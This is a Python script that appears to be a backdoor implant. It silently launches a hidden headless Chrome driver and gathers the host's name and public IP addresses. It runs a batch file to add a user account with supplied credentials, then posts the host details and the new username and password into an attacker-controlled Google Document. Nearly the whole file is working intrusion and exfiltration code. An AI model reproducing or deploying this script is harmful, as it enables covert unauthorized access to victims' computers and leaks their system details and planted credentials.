import socket
import subprocess
import os
import time
import errno
import platform
import warnings
from requests import get
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common import utils
from selenium.webdriver.remote.webdriver import WebDriver as RemoteWebDriver
from selenium.webdriver.chrome import service, webdriver, remote_connection


class HiddenChromeService(service.Service):  # creates hidden Chrome service object
    def start(self):
        try:
            cmd = [self.path]
            cmd.extend(self.command_line_args())

            if platform.system() == 'Windows':
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW
                info.wShowWindow = 0  # SW_HIDE (6 == SW_MINIMIZE)
            else:
                info = None

            self.process = subprocess.Popen(
                cmd, env=self.env,
                close_fds=platform.system() != 'Windows',
                startupinfo=info,
                stdout=self.log_file,
                stderr=self.log_file,
                stdin=subprocess.PIPE)
        except TypeError:
            raise
        except OSError as err:
            if err.errno == errno.ENOENT:
                raise WebDriverException(
                    "'%s' executable needs to be in PATH. %s" % (
                        os.path.basename(self.path), self.start_error_message)
                )
            elif err.errno == errno.EACCES:
                raise WebDriverException(
                    "'%s' executable may have wrong permissions. %s" % (
                        os.path.basename(self.path), self.start_error_message)
                )
            else:
                raise
        except Exception as e:
            raise WebDriverException(
                "Executable %s must be in path. %s\n%s" % (
                    os.path.basename(self.path), self.start_error_message,
                    str(e)))
        count = 0
        while True:
            self.assert_process_still_running()
            if self.is_connectable():
                break
            count += 1
            time.sleep(1)
            if count == 30:
                raise WebDriverException("Can't connect to the Service %s" % (
                    self.path,))


class HiddenChromeWebDriver(webdriver.WebDriver):  # creates hidden Chrome webdriver
    def __init__(self, executable_path="chromedriver", port=0,
                options=None, service_args=None,
                desired_capabilities=None, service_log_path=None,
                chrome_options=None, keep_alive=True):
        if chrome_options:
            warnings.warn('use options instead of chrome_options',
                        DeprecationWarning, stacklevel=2)
            options = chrome_options

        if options is None:
            # desired_capabilities stays as passed in
            if desired_capabilities is None:
                desired_capabilities = self.create_options().to_capabilities()
        else:
            if desired_capabilities is None:
                desired_capabilities = options.to_capabilities()
            else:
                desired_capabilities.update(options.to_capabilities())

        self.service = HiddenChromeService(
            executable_path,
            port=port,
            service_args=service_args,
            log_path=service_log_path)
        self.service.start()

        try:
            RemoteWebDriver.__init__(
                self,
                command_executor=remote_connection.ChromeRemoteConnection(
                    remote_server_addr=self.service.service_url,
                    keep_alive=keep_alive),
                desired_capabilities=desired_capabilities)
        except Exception:
            self.quit()
            raise
        self._is_remote = False


f = open("doclink.txt", "r")
doc_link = f.read().rstrip("\n").strip()
f.close()

f = open("credentials.txt", "r")
cred_list = f.readlines()
f.close()

f = open("cleartext.txt", "r")
clear_code = f.read()
f.close()


def get_driver():  # gets a silent Chrome driver
    from selenium import webdriver

    options_driver = webdriver.ChromeOptions()
    options_driver.add_argument('headless')
    options_driver.add_argument("--silent")
    
    driver = HiddenChromeWebDriver(chrome_options=options_driver)

    return driver


def write_to_doc(send_text):  # writes computer data to the Google Document
    driver = get_driver()
    write_success = False

    while not write_success:
        try:  # attempts to write to the Google Document
            driver.get(doc_link)

            doc = driver.find_element_by_xpath('//*[@id="kix-appview"]/div[7]/div/div[1]/div[1]/div/div/div/div[2]/div/div[2]/div[1]/div/div')
            driver.implicitly_wait(10)
            
            ActionChains(driver).move_to_element(doc).click(doc).send_keys(clear_code).perform()
            ActionChains(driver).move_to_element(doc).click(doc).send_keys(send_text).perform()
            time.sleep(60)
            write_success = True
        except:  # if it fails, the driver is recreated
            time.sleep(5)
            driver = get_driver()


info_success = False

while not info_success:
    try:
        computer_name = socket.getfqdn()
        ip4 = get('https://api.ipify.org').text
        ip6 = socket.getaddrinfo(computer_name, 0, socket.AF_INET6)[0][4][0]

        send_text = "Computer Name: " + computer_name + "\nPublic IPv4: " + ip4 + "\nPublic IPv6: " + ip6
        info_success = True
    except:
        time.sleep(5)

try:
    os.system("usrmke.bat " + cred_list[0].rstrip("\n") + " " + cred_list[1].rstrip("\n"))
    send_text += "\n\nUSER SUCCESSFULLY ADDED\nUsername: " + cred_list[0] + "Password: " + cred_list[1].rstrip("\n")
except Exception as e:
    send_text += "\n\nERROR: USER COULD NOT BE ADDED\n" + e

write_to_doc(send_text)